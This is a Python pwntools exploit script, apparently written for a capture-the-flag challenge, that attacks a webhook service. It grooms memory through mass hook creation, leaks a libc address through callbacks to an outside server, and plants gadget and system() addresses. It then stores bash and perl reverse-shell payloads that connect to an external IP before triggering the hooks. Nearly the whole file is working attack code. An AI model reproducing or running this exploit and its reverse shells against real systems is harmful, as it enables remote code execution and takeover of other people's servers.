from requests import Session
import threading
import time
import random
import binascii
import os, psycopg2
from pwn import *
# bash -i >& /dev/tcp/54.89.179.156/6666 0>&1
revshell = """perl -e 'use Socket;$i="54.89.179.156";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""".rjust(0x20000, ';')
revshell = """bash -c "bash -i >& /dev/tcp/54.89.179.156/6666 0>&1";""".rjust(0x30000, ' ')


URL = args.URL or "localhost:3000"
URL = os.getenv("ADDRESS", URL)
URL = URL.removeprefix("http://")
MY_URL = "http://cyanpencil.xyz:1234/"


def create_hook(s, kind, secret, url):
    r = s.post(f"http://{URL}/_m/34a106c003/transacting", data={"item":0, "kind": kind, "url": url, "secret": secret, "action": "watch"},files={"size":(None,"/")})
    return r

def delete_hooks(s, kind):
    s.post(f"http://{URL}/_m/34a106c003/transacting", data={"item":0, "kind": kind, "action": "unwatch"},files={"size":(None,"/")})

def trigger_hook(s, kind):
    s.post(f"http://{URL}/_m/34a106c003/transacting", data={"item":0, "kind": kind, "action": "notify"},files={"size":(None,"/")})

def smash(s):
    time.sleep(random.uniform(0,0.3))
    create_hook(s, "compass2", 22, "http://127.0.0.1:1234")

def big_hook(s):
    for i in range(0, 4000):
        create_hook(s, "xd", 22, "http://127.0.0.1:1234/A#"+0x30000*"A")
    trigger_hook(s, "compass2")

"""
def smash(s):
    for i in range(0, 4):
        time.sleep(random.uniform(0,0.3))
        create_hook(s, "compass2", 22, "http://127.0.0.1:1234")
"""

def create_session():
    s1 = Session()
    # non shared instance :)
    r = s1.post(f"http://{URL}/_m/2e7970cbec/loggingIn", data={"username":"asdff", "password": "asdff"}, files={"redirectTo":(None,"/")})
    return s1

s = create_session()

def watch_local_actual(kind, target, secret, userId = 0):
    global conn
    if target is None:
        print("None")
        target = "NULL"
    else:
        target = f"{target}"
    sql = f"INSERT INTO hooks(user_id, kind, target, secret) VALUES ({userId}, '{kind}', {target}, {secret})"
    with conn.cursor() as cur:
        cur.execute("INSERT INTO hooks(user_id, kind, target, secret) VALUES (%s, %s, %s, %s)", (userId, kind, target, secret))
    conn.commit()

def watch_local(kind, target, secret, userId = 0):
    if args.LOCAL:
        log.info("Doing local!")
        watch_local_actual(kind, target, secret, userId)
    else:
        global s
        return create_hook(s, kind, secret, target)


restart_query = """
DROP TABLE hooks;
CREATE TABLE hooks (
    id BIGSERIAL PRIMARY KEY,
    user_id BIGINT NOT NULL,
    kind TEXT NOT NULL,
    target TEXT NOT NULL,
    secret BIGINT NOT NULL
);

CREATE INDEX hooks_send_order ON hooks (kind, target, secret);
CREATE INDEX hooks_kind ON hooks (kind);
"""

def reset(cur):
    cur.execute(restart_query)

def list_info(cur: "_Cursor", kind):
    def get_count(kind):
        cur.execute(f"select count(kind) from hooks where kind = '{kind}'")
        return cur.fetchall()[0][0]
    cnt = get_count(kind)
    cur.execute(f"select target, secret from hooks where kind = '{kind}' ORDER BY target LIMIT 10")
    act = len(cur.fetchall())
    print(f"{kind}: {cnt} - {act}")



def add_lmao(many):
    f = open("sigbus_min_main.sql", "r").readlines()[241:241+many]
    for line in f:
        line = line.strip()
        kind = line.split("\t")[2]
        target = line.split("\t")[3]
        watch_local(kind, target, 4141)
        print(line.strip(), kind, target)




# for start in range(80, 82):
    # conn = psycopg2.connect("dbname=postgres user=postgres password=maindb-password host=localhost")
    # conn2 = psycopg2.connect("dbname=postgres user=postgres password=maindb-password host=localhost port=5433")
    # with conn.cursor() as cur:
        # reset(cur)

conn = psycopg2.connect("dbname=postgres user=web password=dbuser-web-password host=localhost")
conn2 = psycopg2.connect("dbname=postgres user=web password=dbuser-web-password host=localhost port=5433")

def padded_target(size = 0x40, cb = False):
    target = TARGET
    if cb:
        target += "pad"
    leftover = size - len(target)
    if leftover > 0:
        target += "A"*leftover
    return target

def do_allocs(size, cb = False):
    global CURR_KIND
    print(watch_local(CURR_KIND, padded_target(size, cb), 0x1337))

def do_notify():
    global CURR_KIND
    notify(CURR_KIND)
    CURR_KIND = "lmaoxd" + str(randint(0, 1000000))

srv = server(1337)

def print_cb():
    conn = srv.next_connection()
    log.info("Received callback!")
    curr = conn.recv(0x1000)
    data = curr
    while len(curr) == 0x1000:
        curr = conn.recv(0x1000)
        data += curr
    print(hexdump(data))
    conn.close()
    return data

CURR_KIND = "first"
TARGET = "http://cyanpencil.xyz:1337/"
TARGET = "54.89.179.156:1337/"

if not args.LOCAL:
    log.info("Running against remote on %s", URL)

do_allocs(0x5e0, True)
time.sleep(0.5)
trigger_hook(s, CURR_KIND)

print_cb()

time.sleep(2.0)

CURR_KIND = "second"

log.info("Trying to get libc leak")
do_allocs(0x608, True)
do_allocs(0x610, True)
time.sleep(2.0)
trigger_hook(s, CURR_KIND)

delete_hooks(s, "first")
delete_hooks(s, "second")


time.sleep(2.0)

# libc = int(input("libc addr?: "), 16)

recvd = print_cb()
recvd: bytes
recvd = recvd.removeprefix(b"POST /pad")
recvd = recvd.strip(b"A")
leaked = recvd.split(b" HTTP")[0]
leaked = leaked.ljust(8, b"\0")
leaked_addr = u64(leaked)
log.info("leaked addr: 0x%x", leaked_addr)

if leaked_addr == 0:
    log.error("Failed to leak address!")

libc = libc_base = leaked_addr - 0x1714a0
log.success("libc @ 0x%x", libc_base)
gadget = 0x21af8 + libc
revshell_addr = libc - 0x14b40cc
revshell_addr = libc - 0xcf5ff0
revshell_addr = libc - 0xd15ff0

revshell_addr = revshell_addr + 0x20000 - 0x200
system = libc  + 0x188830

log.info("gadget " + hex(gadget))
log.info("revshell_addr " + hex(revshell_addr))
log.info("system @ 0x%x", system)

# pause()

# CURR_KIND = "third"
# do_allocs(0x12f8, True)
# time.sleep(2.0)
# trigger_hook(s, CURR_KIND)
# time.sleep(2.0)
# print_cb()
# recvd = print_cb()
# recvd: bytes
# recvd = recvd.removeprefix(b"POST /pad")
# recvd = recvd.strip(b"A")
# leaked = recvd.split(b" HTTP")[0]
# leaked = leaked.ljust(8, b"\0")
# leaked_addr = u64(leaked)
# log.info("leaked addr: 0x%x", leaked_addr)

# revshell_addr = leaked_addr + 0x39630 + 0xa000 - 0x200
# log.info("New revshell addr: 0x%x", revshell_addr)

# delete_hooks(s, CURR_KIND)

# time.sleep(1)

# CURR_KIND = "fourth"
# do_allocs(0x600, True)
# trigger_hook(s, CURR_KIND)
# time.sleep(1.0)
# print_cb()

# exit(0)

idx = 0x100
with log.progress("First batch") as p:
    for x in range(55):
        # create_hook(s, 'aA', 0x5050, 'A')
        watch_local('aA', "lmaoaa", 0xffff)
        p.status("%d / %d", x, 55)
        idx += 1
with log.progress("Second batch") as p:
    for x in range(12):
        # create_hook(s, 'Aa', 0x4040, 'A')
        watch_local('Aa', "lmaoaa", 0xffff)
        p.status("%d / %d", x, 12)
        idx += 1

watch_local('AA', "lmaoaa", gadget)
watch_local('AA', "lmaoab", revshell_addr)
watch_local('AA', "lmaoac", system) 
watch_local('AA', "lmaoad", gadget)

idx = system + 10

with log.progress("Third batch") as p:
    for x in range(21):
        # create_hook(s, 'AA', 0xffff, 'http://cyanpencil.xyz:1234/')
        watch_local('AA', "lmaoxd", idx)
        p.status("%d / %d", x, 21)
        idx += 1

with log.progress("Fourth batch") as p:
    for x in range(99):
        for y in range(80):
            watch_local(f"lmaoxd{y}", "lmaoxd", idx)
            idx += 1
        p.status("%d / %d", x, 99)

with log.progress("Last batch") as p:
    for x in range(18):
        watch_local('AA', "lmaoxd", idx)
        p.status("%d / %d", x, 18)

print(watch_local("AA", revshell, idx))

with conn2.cursor() as cur:
    list_info(cur, 'AA')

log.info("about to trigger your mom")
pause()

time.sleep(2.0)

trigger_hook(s, 'AA')
